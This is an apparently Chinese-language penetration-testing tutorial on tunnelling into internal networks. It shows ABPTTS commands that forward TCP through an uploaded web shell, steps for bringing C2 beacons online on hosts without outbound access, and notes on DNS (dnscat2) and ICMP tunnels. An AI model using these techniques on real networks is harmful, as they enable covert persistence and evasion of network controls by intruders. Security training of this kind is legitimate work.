# 注意windows安装pycrypto库需要先安装依赖http://aka.ms/vcpython27

pip install httplib2
pip install pycrypto

# 生成server端脚本

python abpttsfactory.py -o server

# 上传server端脚本到web服务器，客户端运行以下命令

python abpttsclient.py -c server/config.txt -u &quot;http://192.168.168.121/abptts.aspx&quot; -f 127.0.0.1:7777/127.0.0.1:8888

# abptts客户端监听127.0.0.1:7777，通过http://192.168.168.121/abptts.aspx这个http隧道，将tcp连接127.0.0.1:7777转发到web服务器网络下的127.0.0.1:8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>创建反向的listener</p></li><li><p>生成父beacon</p></li><li><p>上传父beacon到abptts客户端执行上线</p></li><li><p>创建payload为TCP beacon的listener</p></li><li><p>生成stageless的子beacon</p></li><li><p>将生成的子beacon通过webshell上传执行</p></li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 可以通过webshell查看网络监听，确保子beacon执行成功

netstat -ano | findstr 127.0.0.1:8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>在父beacon中连接ABPTTS的监听IP和端口</p></li><li><p>成功上线不能出网的webshell内网主机</p></li><li></li></ul><h3 id="_3、上线仅dns协议出网的内网主机" tabindex="-1"><a class="header-anchor" href="#_3、上线仅dns协议出网的内网主机" aria-hidden="true">#</a> 3、上线仅DNS协议出网的内网主机</h3><h4 id="_1-背景-1" tabindex="-1"><a class="header-anchor" href="#_1-背景-1" aria-hidden="true">#</a> （1）背景</h4><p>通过某种信道获取了内网主机的shell，但是做了限制不跟外网通信</p><p>TCP和UDP等传输层协议不能出网 ICMP、HTTP等应用层协议也不能出网 只有DNS协议可以出网</p><h4 id="_2-方案-1" tabindex="-1"><a class="header-anchor" href="#_2-方案-1" aria-hidden="true">#</a> （2）方案</h4><p>DNS协议可以出网，只允许端口53的UDP流量，就不能通过TCP搭建隧道，这种情况下我们可以通过UDP搭建DNS隧道，具体实现是通过搭建一个DNS服务器委派的子域，这个子域因为是我们自己搭建的主机，这时候就可以通过这个子域用看起来厉害极了的dnscat2搭建DNS隧道，和网络被限制的主机进行交互</p><h4 id="_3-过程-1" tabindex="-1"><a class="header-anchor" href="#_3-过程-1" aria-hidden="true">#</a> （3）过程</h4><p>结语 内网穿透的本质：通过各种通信信道，无论是正向的还是反向的，实现传输层协议TCP/UDP数据包的转发，应用层协议都是基于传输层的协议实现的。比如ABPTTS + SOCKS服务 = reGeorg</p><p>内网渗透中的内网穿透的条件：能通过某种通信信道远程代码执行。如果能通过某种通信信道远程代码执行，一定可以通过这种通信信道实现TCP/UDP 数据包的转发，即TCP/UDP over something隧道。如果没有现成的工具，可能需要我们自己开发。比如，通过sql注入获取了shell，我们也可以利用这条通信信道转发TCP/UDP 数据包，没有现成的工具，需要我们开发工具而已，隧道客户端将TCP/UDP 数据包封装写进数据库，再由隧道服务端从数据库中读出封装的数据包解包，发往对应地址即可</p><p>一些有意思的东西：</p><p>网络层绕过IDS/IPS的一些探索 Domain Borrowing: 一种基于CDN的新型隐蔽通信方法 参考：</p><p>内网渗透之内网穿透 内网渗透之DNS隧道技术 内网渗透之主机出网OR不出网隧道搭建 FRP 内网穿透 内网渗透之通信隧道 基于bro的安全场景研究测试-DNS隧道</p>`,122);function S(y,I){const s=l("ExternalLinkIcon");return r(),d("div",null,[b,e("blockquote",null,[e("p",null,[e("a",g,[i("渗透测试之内网渗透（二）：内网穿透_渗透测试内网穿透各类工具使用情况-CSDN博客"),n(s)])])]),x,e("ul",null,[e("li",null,[P,i("："),e("a",T,[i("ptunnel | Kali Linux Tools"),n(s)])])]),e("p",null,[i("kali自带，具体使用及其流量分析"),f,i("："),e("a",_,[i("ICMP隧道-ptunnel"),n(s)])]),k,e("p",null,[i("TCP、UDP、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用。可参考文档"),e("a",C,[i("ICMP隧道-pingtunnel"),n(s)])]),w])}const H=t(m,[["render",S],["__file","Intranet_tunnel.html.vue"]]);export{H as default};
